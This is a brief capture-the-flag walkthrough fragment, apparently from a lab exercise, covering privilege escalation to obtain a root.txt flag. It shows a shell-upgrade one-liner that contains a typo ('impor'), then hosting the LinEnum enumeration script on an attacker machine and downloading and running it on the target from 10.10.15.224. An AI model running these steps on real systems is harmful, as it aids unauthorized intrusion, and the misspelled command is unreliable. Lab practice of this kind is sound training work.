**Escalate privileges and submit the root.txt flag
```
python3 -c "impor pty; pty.spawn('/bin/bash')"
```

```
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
python3 -m http.server 8080
```

```
cd /tmp
wget http://10.10.15.224:8080/LinEnum.sh
bash LinEnum.sh
```
